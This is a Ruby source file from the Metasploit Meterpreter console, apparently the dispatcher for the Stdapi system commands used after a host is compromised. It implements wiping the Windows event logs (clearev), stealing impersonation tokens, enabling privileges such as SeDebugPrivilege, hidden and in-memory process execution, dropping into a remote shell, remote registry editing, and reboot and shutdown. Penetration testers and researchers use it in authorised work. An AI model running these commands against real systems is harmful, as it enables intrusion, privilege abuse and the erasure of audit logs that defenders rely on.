require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The system level portion of the standard API extension.
#
###
class Console::CommandDispatcher::Stdapi::Sys

	Klass = Console::CommandDispatcher::Stdapi::Sys

	include Console::CommandDispatcher

	#
	# Options used by the 'execute' command.
	#
	@@execute_opts = Rex::Parser::Arguments.new(
		"-a" => [ true,  "The arguments to pass to the command."                   ],
		"-c" => [ false, "Channelized I/O (required for interaction)."             ],
		"-f" => [ true,  "The executable command to run."                          ],
		"-h" => [ false, "Help menu."                                              ],
		"-H" => [ false, "Create the process hidden from view."                    ],
		"-i" => [ false, "Interact with the process after creating it."            ],
		"-m" => [ false, "Execute from memory."                                    ],
		"-d" => [ true,  "The 'dummy' executable to launch when using -m."         ],
		"-t" => [ false, "Execute process with currently impersonated thread token"],
		"-k" => [ false, "Execute process on the meterpreters current desktop"     ],
		"-s" => [ true,  "Execute process in a given session as the session user"  ])

	#
	# Options used by the 'reg' command.
	#
	@@reg_opts = Rex::Parser::Arguments.new(
		"-d" => [ true,  "The data to store in the registry value."                ],
		"-h" => [ false, "Help menu."                                              ],
		"-k" => [ true,  "The registry key path (E.g. HKLM\\Software\\Foo)."       ],
		"-t" => [ true,  "The registry value type (E.g. REG_SZ)."                  ],
		"-v" => [ true,  "The registry value name (E.g. Stuff)."                   ],
		"-r" => [ true,  "The remote machine name to connect to (with current process credentials" ],
		"-w" => [ false,  "Set KEY_WOW64 flag, valid values [32|64]."               ])

	#
	# List of supported commands.
	#
	def commands
		{
			"clearev"  => "Clear the event log",
			"execute"  => "Execute a command",
			"getpid"   => "Get the current process identifier",
			"getuid"   => "Get the user that the server is running as",
			"getprivs" => "Attempt to enable all privileges available to the current process",
			"kill"     => "Terminate a process",
			"ps"       => "List running processes",
			"reboot"   => "Reboots the remote computer",
			"reg"      => "Modify and interact with the remote registry",
			"rev2self" => "Calls RevertToSelf() on the remote machine",
			"sysinfo"  => "Gets information about the remote system, such as OS",
			"shell"    => "Drop into a system command shell",
			"shutdown" => "Shuts down the remote computer",
			"steal_token" => "Attempts to steal an impersonation token from the target process",
			"drop_token"  => "Relinquishes any active impersonation token.",
		}
	end

	#
	# Name for this dispatcher.
	#
	def name
		"Stdapi: System"
	end

	#
	# Executes a command with some options.
	#
	def cmd_execute(*args)
		if (args.length == 0)
			args.unshift("-h")
		end

		session     = nil
		interact    = false
		desktop     = false
		channelized = nil
		hidden      = nil
		from_mem    = false
		dummy_exec  = "cmd"
		cmd_args    = nil
		cmd_exec    = nil
		use_thread_token = false

		@@execute_opts.parse(args) { |opt, idx, val|
			case opt
				when "-a"
					cmd_args = val
				when "-c"
					channelized = true
				when "-f"
					cmd_exec = val
				when "-H"
					hidden = true
				when "-m"
					from_mem = true
				when "-d"
					dummy_exec = val
				when "-k"
					desktop = true
				when "-h"
					print(
						"Usage: execute -f file [options]\n\n" +
						"Executes a command on the remote machine.\n" +
						@@execute_opts.usage)
					return true
				when "-i"
					channelized = true
					interact = true
				when "-t"
					use_thread_token = true
				when "-s"
					session = val.to_i
			end
		}

		# Did we at least get an executable?
		if (cmd_exec == nil)
			print_error("You must specify an executable file with -f")
			return true
		end

		# Execute it
		p = client.sys.process.execute(cmd_exec, cmd_args,
			'Channelized' => channelized,
			'Desktop'     => desktop,
			'Session'     => session,
			'Hidden'      => hidden,
			'InMemory'    => (from_mem) ? dummy_exec : nil,
			'UseThreadToken' => use_thread_token)

		print_line("Process #{p.pid} created.")
		print_line("Channel #{p.channel.cid} created.") if (p.channel)

		if (interact and p.channel)
			shell.interact_with_channel(p.channel)
		end
	end


	#
	# Drop into a system shell as specified by %COMSPEC% or
	# as appropriate for the host.
	def cmd_shell(*args)
		if client.platform =~/win/
			path = client.fs.file.expand_path("%COMSPEC%")
			path = (path and not path.empty?) ? path : "cmd.exe"
			cmd_execute("-f", path, "-c", "-H", "-i", "-t")
		else
			path = client.fs.file.expand_path("/bin/bash")
			cmd_execute("-f", path, "-c", "-i")
		end
	end


	#
	# Gets the process identifier that meterpreter is running in on the remote
	# machine.
	#
	def cmd_getpid(*args)
		print_line("Current pid: #{client.sys.process.getpid}")

		return true
	end

	#
	# Displays the user that the server is running as.
	#
	def cmd_getuid(*args)
		print_line("Server username: #{client.sys.config.getuid}")
	end

	#
	# Clears the event log
	#
	def cmd_clearev(*args)

		logs = ['Application', 'System', 'Security']
		logs << args
		logs.flatten!

		logs.each do |name|
			log = client.sys.eventlog.open(name)
			print_status("Wiping #{log.length} records from #{name}...")
			log.clear
		end
	end

	#
	# Kills one or more processes.
	#
	def cmd_kill(*args)
		if (args.length == 0)
			print_line(
				"Usage: kill pid1 pid2 pid3 ...\n\n" +
				"Terminate one or more processes.")
			return true
		end

		print_line("Killing: #{args.join(", ")}")

		client.sys.process.kill(*(args.map { |x| x.to_i }))

		return true
	end

	#
	# Lists running processes.
	#
	def cmd_ps(*args)
		processes = client.sys.process.get_processes
		tbl = Rex::Ui::Text::Table.new(
			'Header'  => "Process list",
			'Indent'  => 1,
			'Columns' =>
				[
					"PID",
					"Name",
					"Arch",
					"Session",
					"User",
					"Path"
				])

		processes.each { |ent|

			session = ent['session'] == 0xFFFFFFFF ? '' : ent['session'].to_s
			arch    = ent['arch']

			# for display and consistency with payload naming we switch the internal 'x86_64' value to display 'x64'
			if( arch == ARCH_X86_64 )
				arch = "x64"
			end

			tbl << [ ent['pid'].to_s, ent['name'], arch, session, ent['user'], ent['path'] ]
		}

		if (processes.length == 0)
			print_line("No running processes were found.")
		else
			print("\n" + tbl.to_s + "\n")
		end

		return true
	end

	#
	# Reboots the remote computer.
	#
	def cmd_reboot(*args)
		print_line("Rebooting...")

		client.sys.power.reboot
	end

	#
	# Modifies and otherwise interacts with the registry on the remote computer
	# by allowing the client to enumerate, open, modify, and delete registry
	# keys and values.
	#
	def cmd_reg(*args)
		# Extract the command, if any
		cmd = args.shift

		if (args.length == 0)
			args.unshift("-h")
		end

		# Initiailze vars
		key     = nil
		value   = nil
		data    = nil
		type    = nil
		wowflag = 0x0000
		rem     = nil

		@@reg_opts.parse(args) { |opt, idx, val|
			case opt
				when "-h"
					print_line(
						"Usage: reg [command] [options]\n\n" +
						"Interact with the target machine's registry.\n" +
						@@reg_opts.usage +
						"COMMANDS:\n\n" +
						"    enumkey    Enumerate the supplied registry key [-k <key>]\n" +
						"    createkey  Create the supplied registry key  [-k <key>]\n" +
						"    deletekey  Delete the supplied registry key  [-k <key>]\n" +
						"    queryclass Queries the class of the supplied key [-k <key>]\n" +
						"    setval     Set a registry value [-k <key> -v <val> -d <data>]\n" +
						"    deleteval  Delete the supplied registry value [-k <key> -v <val>]\n" +
						"    queryval   Queries the data contents of a value [-k <key> -v <val>]\n\n") 
					return false
				when "-k"
					key   = val
				when "-v"
					value = val
				when "-t"
					type  = val
				when "-d"
					data  = val
				when "-r"
					rem  = val
				when "-w"
					if val == '64'
						wowflag = KEY_WOW64_64KEY
					elsif val == '32'
						wowflag = KEY_WOW64_32KEY
					end
			end
		}

		# All commands require a key.
		if (key == nil)
			print_error("You must specify a key path (-k)")
			return false
		end

		# Split the key into its parts
		root_key, base_key = client.sys.registry.splitkey(key)

		begin
			# Rock it
			case cmd
				when "enumkey"
				
					open_key = nil
					if not rem
						open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + wowflag)
					else
						remote_key = client.sys.registry.open_remote_key(rem, root_key)
						if remote_key
							open_key = remote_key.open_key(base_key, KEY_READ + wowflag)
						end
					end

					print_line(
						"Enumerating: #{key}\n")

					keys = open_key.enum_key
					vals = open_key.enum_value

					if (keys.length > 0)
						print_line("  Keys (#{keys.length}):\n")

						keys.each { |subkey|
							print_line("\t#{subkey}")
						}

						print_line
					end

					if (vals.length > 0)
						print_line("  Values (#{vals.length}):\n")

						vals.each { |val|
							print_line("\t#{val.name}")
						}

						print_line
					end

					if (vals.length == 0 and keys.length == 0)
						print_line("No children.")
					end

				when "createkey"
					open_key = nil
					if not rem
						open_key = client.sys.registry.create_key(root_key, base_key, KEY_WRITE + wowflag)
					else
						remote_key = client.sys.registry.open_remote_key(rem, root_key)
						if remote_key
							open_key = remote_key.create_key(base_key, KEY_WRITE + wowflag)
						end
					end				

					print_line("Successfully created key: #{key}")

				when "deletekey"
					open_key = nil
					if not rem
						open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE + wowflag)
					else
						remote_key = client.sys.registry.open_remote_key(rem, root_key)
						if remote_key
							open_key = remote_key.open_key(base_key, KEY_WRITE + wowflag)
						end
					end
					open_key.delete_key(base_key)

					print_line("Successfully deleted key: #{key}")

				when "setval"
					if (value == nil or data == nil)
						print_error("You must specify both a value name and data (-v, -d).")
						return false
					end

					type = "REG_SZ" if (type == nil)

					open_key = nil
					if not rem
						open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE + wowflag)
					else
						remote_key = client.sys.registry.open_remote_key(rem, root_key)
						if remote_key
							open_key = remote_key.open_key(base_key, KEY_WRITE + wowflag)
						end
					end

					open_key.set_value(value, client.sys.registry.type2str(type), data)

					print_line("Successful set #{value}.")

				when "deleteval"
					if (value == nil)
						print_error("You must specify a value name (-v).")
						return false
					end

					open_key = nil
					if not rem
						open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE + wowflag)
					else
						remote_key = client.sys.registry.open_remote_key(rem, root_key)
						if remote_key
							open_key = remote_key.open_key(base_key, KEY_WRITE + wowflag)
						end
					end

					open_key.delete_value(value)

					print_line("Successfully deleted #{value}.")

				when "queryval"
					if (value == nil)
						print_error("You must specify a value name (-v).")
						return false
					end

					open_key = nil
					if not rem
						open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + wowflag)
					else
						remote_key = client.sys.registry.open_remote_key(rem, root_key)
						if remote_key
							open_key = remote_key.open_key(base_key, KEY_READ + wowflag)
						end
					end

					v = open_key.query_value(value)

					print(
						"Key: #{key}\n" +
						"Name: #{v.name}\n" +
						"Type: #{v.type_to_s}\n" +
						"Data: #{v.data}\n")

				when "queryclass"
					open_key = nil
					if not rem
						open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + wowflag)
					else
						remote_key = client.sys.registry.open_remote_key(rem, root_key)
						if remote_key
							open_key = remote_key.open_key(base_key, KEY_READ + wowflag)
						end
					end

					data = open_key.query_class

					print("Data: #{data}\n")
				else
					print_error("Invalid command supplied: #{cmd}")
			end
		ensure
			open_key.close if (open_key)
		end
	end

	#
	# Calls RevertToSelf() on the remote machine.
	#
	def cmd_rev2self(*args)
		client.sys.config.revert_to_self
	end

	def cmd_getprivs_help
		print_line "Usage: getprivs"
		print_line
		print_line "Attempt to enable all privileges, such as SeDebugPrivilege, available to the"
		print_line "current process.  Note that this only enables existing privs and does not change"
		print_line "users or tokens."
		print_line
		print_line "See also: steal_token, getsystem"
		print_line
	end

	#
	# Obtains as many privileges as possible on the target machine.
	#
	def cmd_getprivs(*args)
		if args.include? "-h"
			cmd_getprivs_help
		end
		print_line("=" * 60)
		print_line("Enabled Process Privileges")
		print_line("=" * 60)
		client.sys.config.getprivs.each do |priv|
			print_line("  #{priv}")
		end
		print_line("")
	end

	#
	# Tries to steal the primary token from the target process.
	#
	def cmd_steal_token(*args)
		if(args.length != 1 or args[0] == "-h")
			print_error("Usage: steal_token [pid]")
			return
		end
		print_line("Stolen token with username: " + client.sys.config.steal_token(args[0]))
	end

	#
	# Drops any assumed token.
	#
	def cmd_drop_token(*args)
		print_line("Relinquished token, now running as: " + client.sys.config.drop_token())
	end

	#
	# Displays information about the remote system.
	#
	def cmd_sysinfo(*args)
		info = client.sys.config.sysinfo
		width = "Meterpreter".length
		info.keys.each { |k| width = k.length if k.length > width and info[k] }

		info.each_pair do |key, value|
			print_line("#{key.ljust(width+1)}: #{value}") if value
		end
		print_line("#{"Meterpreter".ljust(width+1)}: #{client.platform}")

		return true
	end

	#
	# Shuts down the remote computer.
	#
	def cmd_shutdown(*args)
		print_line("Shutting down...")

		client.sys.power.shutdown
	end

end

end
end
end
end

